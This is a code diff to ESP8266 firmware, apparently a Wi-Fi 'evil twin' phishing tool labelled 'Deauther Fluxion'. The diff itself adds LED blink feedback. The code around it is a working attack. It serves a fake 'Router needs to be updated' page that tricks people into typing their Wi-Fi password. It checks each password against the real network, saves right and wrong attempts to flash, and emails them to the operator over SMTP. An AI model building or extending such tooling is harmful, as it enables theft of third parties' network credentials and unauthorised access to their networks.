@@ -1,7 +1,8 @@
 #include "LittleFSRW.h"
 #include "GlobalVar.h"
 #include "ESPMailSend.h"
-#include "html5.h"
+#include "HTML5.h"
+#include "LedTicker.h"
 
 void clearArray() {
   for (int i = 0; i < 16; i++) {
@@ -33,6 +34,7 @@ void handleResult() {
   if (WiFi.status() != WL_CONNECTED) {
     webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
     Serial.println("Wrong password tried !");
+    flipper.attach(0.3, flip);
   } else {
     webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
     hotspot_active = false;
@@ -47,12 +49,7 @@ void handleResult() {
     // "<li><b>" + + "</li></b>"
     appendFile(LittleFS, "/pass.txt", _SSIDPassword.c_str());
     //_SSIDPassword.toCharArray(msg, 50);
-    /*
-      if (!client.connected()) {
-      reconnect();
-      }
-      client.publish("SavedSSIDPassword", msg);
-    */
+
     smtpsend(_wrongSSIDPassword, "Deauther Fluxion | Wrong Password");
     smtpsend(_SSIDPassword, "Deauther Fluxion | Good Password");
 
@@ -64,9 +61,7 @@ void handleResult() {
     //readFile(LittleFS, "/password.txt");
     _savedSSIDPassword = readFiles(LittleFS, "/password.txt");
     Serial.println(_savedSSIDPassword);
-
-    //String& SSIDPassword = "SavedSSIDPassword";
-    //Serial.println(SSIDPassword);
+    flipper.attach(0.1, flip);
   }
 }
 
@@ -171,14 +166,16 @@ void handleIndex() {
       _wrongSSIDPassword = "SSID : " + _selectedNetwork.ssid + " Password : " + _tryPassword ;
       appendFile(LittleFS, "/wrongpass.txt", _wrongSSIDPassword.c_str());
 
-      _wrongSSIDPassword = "<li>" + _wrongSSIDPassword + "</li>";
-      _savedwrongSSIDPassword += _wrongSSIDPassword;
+      String _wrongSSIDPasswordtemp = "<li>" + _wrongSSIDPassword + "</li>";
+      _savedwrongSSIDPassword += _wrongSSIDPasswordtemp;
       appendFile(LittleFS, "/wrongpassword.txt", _savedwrongSSIDPassword.c_str());
       WiFi.disconnect();
       WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
+      flipper.attach(0.6, flip);
       webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
     } else {
       webServer.send(200, "text/html", "<!DOCTYPE html>" + _Head + "</head><body><h2>Router '" + _selectedNetwork.ssid + "' needs to be updated</h2><form action='/'><label for='password'>Password:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Submit'> </form> </body> </html>");
+      flipper.attach(1, flip);
     }
   }
 
@@ -344,7 +341,9 @@ void setup() {
     Serial.println("LittleFS mount failed");
     return;
   }
-
+  pinMode(LED_BUILTIN, OUTPUT);
+  digitalWrite(LED_BUILTIN, LOW);
+  
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
